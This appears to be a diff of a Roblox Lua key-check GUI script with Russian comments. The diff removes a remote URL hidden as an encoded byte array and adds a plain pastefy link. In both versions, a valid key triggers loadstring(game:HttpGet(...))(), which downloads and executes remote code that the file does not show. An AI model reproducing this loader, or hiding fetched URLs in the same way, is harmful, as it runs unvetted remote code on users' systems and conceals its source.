@@ -132,7 +132,7 @@ frame.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
         dragging = true
         dragStart = input.Position
-        startPos = frame.Position
+        startPos = frame.Position 
         input.Changed:Connect(function()
             if input.UserInputState == Enum.UserInputState.End then
                 dragging = false
@@ -147,25 +147,7 @@ UserInputService.InputChanged:Connect(function(input)
     end
 end)
 
--- Скрытый URL в виде массива байтов (новый скрипт)
-local urlBytes = {
-    104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,
-    101,114,99,111,110,116,101,110,116,46,99,111,109,47,105,108,121,49,50,51,
-    57,53,48,47,86,117,108,107,97,110,47,114,101,102,115,47,104,101,97,100,115,
-    47,109,97,105,110,47,84,114,120
-}
-
-local function bytesToString(bytes)
-    local s = {}
-    for i = 1, #bytes do
-        s[i] = string.char(bytes[i])
-    end
-    return table.concat(s)
-end
-
-local hiddenUrl = bytesToString(urlBytes)
-
--- Проверка ключа и запуск нового скрипта
+-- Проверка ключа и запуск скрипта
 button.MouseButton1Click:Connect(function()
     local input = box.Text:match("^%s*(.-)%s*$")
     if not validKey then
@@ -176,7 +158,7 @@ button.MouseButton1Click:Connect(function()
         feedback.TextColor3 = Color3.fromRGB(30, 200, 30)
         wait(1)
         gui:Destroy()
-        loadstring(game:HttpGet(hiddenUrl))()
+        loadstring(game:HttpGet("https://pastefy.app/7MQOgJCO/raw"))()
     else
         feedback.Text = "❌ Неверный ключ"
         feedback.TextColor3 = Color3.fromRGB(200, 40, 40)
